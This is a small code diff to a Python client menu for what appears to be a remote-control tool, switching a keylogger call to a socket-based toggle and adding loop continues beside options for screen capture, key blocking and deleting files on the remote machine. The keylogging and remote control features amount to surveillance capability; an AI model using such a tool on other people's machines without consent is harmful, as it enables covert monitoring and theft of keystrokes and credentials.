@@ -5,7 +5,7 @@ from screen_capturing import screen_capturing
 from utils import clear_screen
 from list_start_stop_app import list_start_stop_app
 from list_start_stop_service import list_start_stop_service
-from key_logger import start_key_logger
+from key_logger import toggle_key_logger
 
 def is_valid_ip_address(ip):
     try:
@@ -76,11 +76,13 @@ def main():
                 print("Reset cancelled.")
         elif choice == '5':
             screen_capturing(client_socket)
+            continue
         elif choice == '6':
             client_socket.sendall("BLOCK_KEYS".encode())
             break
         elif choice == '7':
-            start_key_logger(server_ip, port)
+            toggle_key_logger(client_socket)
+            continue
         elif choice == '8':
             file_path = input("Enter the full path of the file to delete on server: ")
             delete_file_from_server(client_socket, file_path)
